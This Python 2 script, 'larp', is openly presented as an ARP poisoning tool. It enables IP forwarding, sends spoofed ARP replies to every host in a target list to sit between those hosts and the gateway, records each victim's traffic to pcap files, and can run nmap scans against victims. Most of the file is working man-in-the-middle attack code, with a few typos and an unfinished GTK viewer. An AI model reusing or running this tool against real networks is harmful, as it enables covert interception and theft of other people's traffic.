#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Script made by papi
#
# Arp poisonning tool used for retreiving data
# provide it a file named host.txt for the hosts he has to arp
# provide it an argument with the gateway ip
# it will arp the entire network to your' machine
# use threading to arp individual clients
# and setup a shell so that when you send an id it stops certain arps
import sys
import multiprocessing
import subprocess
import getopt

import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk

from scapy.all import *
from termcolor import colored

def usage():
    print "%s is a script that performs an arp poisonning attack" % sys.argv[0]
    print
    print "Usage:"
    print "\t%s -h    => show this message" % sys.argv[0]
    print "\t%s -a [subnet_mask]  => automate the program" % sys.argv[0]
    print "\t%s -i --interface => provide the interface to use" % sys.argv[0]
    print "\t%s -g --gateway => provide the gateway to arp to" % sys.argv[0]
    print "\t%s -f --file   => provide the file of all of the target" % sys.argv[0]
    print "Example:"
    print "\t%s -i wlan0 -g 192.168.1.1 -t target_ip_list.txt" % sys.argv[0]
    print "\t%s -i wlan0 -g 192.168.1.1" % sys.argv[0]
    print "\t[!] The above one will look for /tmp/t_ip.txt for the targets list"
    print
    print "\t%s" % sys.argv[0]
    print "\t[!] The above one will implicitly think that you are using wlp2s0"
    print "\t[!] for the interface and 192.168.1.1 for the gateway and using"
    print "\t[!] /tmp/t_ip.txt"

#------ BHP code ------

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def poison(gateway_ip, gateway_mac, target_ip, target_mac):
    while True:
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac))
        time.sleep(2)

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src
#---GTK 3 Course -----

import gi
import time
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk

class ImgDisplay(Gtk.Window):

    def __init__(self):
        Gtk.Window.__init__(self, title="Image Display")
        self.set_border_width(3)
        self.connect("delete-event", Gtk.main_quit)

        self.box = Gtk.Box(spacing=6)

        self.spinner = Gtk.Spinner()
        self.spinner_on = True

        self.table = Gtk.Table(3, 2, True)
        self.table.attach(self.box, 0, 2, 0, 2)
        self.table.attach(self.spinner, 0, 2, 0, 1)

        self.add(self.table)
        self.spinner.start()
        self.show_all()

    def update_image(self, data=None):

        image = Gtk.Image()
        image.set_from_file(data)
        self.box.add(image)
        self.box.show_all()

    def triger_spinner(self, widget, spin_status=False):

        if spin_status and self.spinner_on == False:
            self.spinner.start()
            self.spinner_on = True

        if spin_status == False and self.spinner_on:
            self.spinner.stop()
            self.spinner_on = False


#---------------------

class larp():
    '''-*- larp class -*-
        larp is software made by papi for arp poisonning
    '''

    def __init__(self, gateway_ip, interface, file_name, v=0):
        # setup all of the variables and the configurations
        print colored("[*] Starting up...", "green")
        self.win = ImgDisplay()
        conf.iface = interface
        conf.verb = v
        self.interface = interface
        self.g_ip = gateway_ip
        self.interface = interface
        self.g_mac = get_mac(self.g_ip)
        self.t_ip = []
        self.t_mac = dict()         # map ip -> mac addr
        self.thread_array = []
        try:            # get all of the ip addr's
            with open(file_name, "r") as f:
                temp_ip = f.readlines()
                temp_ip = [ x.strip() for x in temp_ip ]
                f.close()
            with open("/proc/sys/net/ipv4/ip_forward", "r") as forward_file:
                data = forward_file.read()
                data = data.strip()
                forward_file.close()
            print colored("[^] ip_forward configuration: %s" % data, "blue")
            if "0" in data:
                print colored("[!] modifing /proc/sys/net/ipv4/ip_forward to 1"\
                , "red")
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                    f.close()
            print colored("[*] Retreiving mac addrs", "green")
            for ip in temp_ip:
                temp = get_mac(ip)
                if temp == None:
                    print colored("[!] Skipping %s, mac addr is None" % ip, "red")
                elif ip == gateway_ip:
                    print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                else:
                    self.t_ip.append(ip)
                    self.t_mac[ip] = temp
        except:
            self.error("file provided does not exist and permission error")
        print colored("[*] Setup finished!", "green")

    def error(self, msg=""):
        print >> sys.stderr, colored(msg, 'red')
        sys.exit(-1)

    def sniffer(self, target_ip):
        bpf_filter = "ip host %s" % target_ip
        os.mkdir("/tmp/larp_%s" % target_ip)
        f_i = 0
        while True:
            packets = sniff(filter=bpf_filter, iface=self.interface, count=1)
            wrpcap('/tmp/larp_%s/larp_sniffer_%s_%d.cap' % (target_ip, target_ip, f_i), packest)
            f_i += 1

    def main(self):
        t_id = 0    # thread id
        id_map = dict()
        print colored("[*] Main Thread", "green")
        print colored("[^] Starting ARP poison", "blue")
        for ip in self.t_ip:
            self.thread_array.append(multiprocessing.Process(target=poison,\
            args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
            self.thread_array[t_id].start()
            id_map[t_id] = [ip, self.t_mac[ip], None , None]
            # id_mapper  ip |  mac addr |  if sniffing|if in gtk
            t_id += 1
        print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")
        while len(id_map):
            buf = raw_input('#>')
            try:
                if "all" in buf or "a" == buf:
                    for i in xrange(0, t_id):
                        self.thread_array[i].terminate()
                        restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
                        print colored("[^] Restored: %s" % id_map[i][0], "blue")
                        if id_map[i][2] is not None:
                            id_map[i][2].terminate()
                            print colored("[^] Stoped sniffer for %s" % id_map[i][0], "blue")
                        del id_map[i]
                elif "list" in buf or "l" == buf:
                    for i in xrange(0, t_id):
                        print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
                elif "sniff" in buf or "s" == buf.split(' ')[0]:
                    i = int(buf.split(' ')[1])
                    print colored("[^] Sniffig %d => %s" % (int(buf.split(' ')[1]),id_map[i][0]), "blue")
                    print colored("[!] Sniffer packet stored in files 10 by 10 and it only sniffs for http", "red")
                    id_map[i][2] = multiprocessing.Process( target=self.sniffer,\
                    args=(id_map[i][0],))
                    id_map[i][2].start()
                elif "nmap" in buf or "n" == buf.split(' ')[0]:
                    data = 1
                    i = int(buf.split(' ')[1])
                    print colored("[^] running nmap on %d => %s" % (i, id_map[i][0]), "blue")
                    print colored("[*] Output:", "green")
                    os.system("nmap %s" %id_map[i][0])
                elif "gtk" in buf or "g" == buf.split(' ')[0]:
                    i = int(buf.split(' ')[1])
                    print colored("[^] Opening Gtk image viewer for %d => %s" % (i, id_map[i][0]), "blue")
                else:
                    self.thread_array[int(buf)].terminate()
                    restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
                    print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
                    if id_map[int(buf)][2] != None:
                        id_map[int(buf)][2].termincate()
                        print colored("[^] Stoped sniffer for %s" % id_map[int(buf)][0], "blue")
                    del id_map[int(buf)]
            except:
                print colored("[!] Available commands: all - list - sniff - nmap", "red")
        for thread in self.thread_array:
            thread.join()

if __name__ == "__main__":
    interface = None
    gateway = None
    target_file = None
    try:
        optlist, args = getopt.getopt(sys.argv[1:], "ha:ig:f:",\
            ["help", "auto", "interface", "gateway", "file"])
    except:
        print >> sys.stderr, colored("[!] YOU DID NOT PROVIDE THE GOOD NUMBER OF ARGUMENTS:\n%s" % str(getopt.GetoptError), 'red')
        usage()
        sys.exit(-1)
    for o, a in optlist:
        if o in ("-h", "--help"):
            usage()
            sys.exit(1)
        elif o in ("-a", "--auto"):
            pass #automode
        elif o in ("-i", "--interface"):
            interface = a
        elif o in ("-g", "--gateway"):
            gateway = a
        elif o in ("-f", "--file"):
            target_file = a
        else:
            assert False, "Umhandled Option"
    #-----------------------------------------
    if not interface:
        interface = "wlp2s0"
    if not gateway:
        gateway = "192.168.1.1"
    if not target_file:
        target_file = "/tmp/t_ip.txt"
    #----------------------------------------
    ls = larp(gateway, interface, target_file)
    ls.main()
